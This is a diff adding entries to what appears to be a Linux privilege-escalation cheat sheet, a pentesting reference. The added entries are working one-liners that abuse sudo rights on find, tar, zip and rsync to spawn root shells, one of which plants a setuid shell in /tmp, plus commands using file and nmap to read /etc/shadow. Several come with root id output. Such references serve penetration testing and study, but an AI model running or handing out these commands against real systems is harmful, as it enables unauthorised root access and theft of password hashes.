@@ -221,6 +221,8 @@ Copy and overwrite /etc/shadow
 sudo find / -exec bash -i \;
 
 find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
+
+sudo find /dev/null -exec sh \;
 ```
 
 `ht`
@@ -249,6 +251,43 @@ sudo more /home/pelle/myfile
 ##### mv
 
 Overwrite `/etc/shadow` or `/etc/sudoers`
+
+##### file
+
+```
+ sudo file -m /etc/shadow
+```
+
+##### tar
+
+```
+touch somefile
+sudo tar cf /dev/null somefile --checkpoint=1 --checkpoint-action=exec=/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+##### zip
+
+```
+touch somefile
+sudo zip -q /tmp/test.zip somefile -T -TT '/bin/sh #'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+##### rsync
+
+```
+user@host:/tmp$ cat > somefile << EOF
+> cp /bin/sh /tmp/sh_root
+> chmod a+sx /tmp/sh_root
+> EOF
+user@host:/tmp$ sudo rsync  -e 'sh /tmp/somefile' /dev/null 127.0.0.1:/dev/null 2>/dev/null
+user@host:/tmp$ /tmp/sh_root
+# whoami
+root
+```
 
 `man`
 
@@ -302,6 +341,12 @@ or
 
 ```
 nmap --interactive
+```
+
+or 
+
+```
+sudo nmap -iL /etc/shadow 2>&1 | grep root
 ```
 
 ##### python/perl/ruby/lua/etc
@@ -528,6 +573,8 @@ If you have access to an account with sudo-rights but you don't have its passwor
 [http://netsec.ws/?p=309](http://netsec.ws/?p=309)
 
 [https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/](https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/)
+
+[http://opentechnotes.blogspot.com/2014/05/abusing-sudo-to-get-root.html](http://opentechnotes.blogspot.com/2014/05/abusing-sudo-to-get-root.html)
 
 Watch this video!  
 [http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams](http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams)
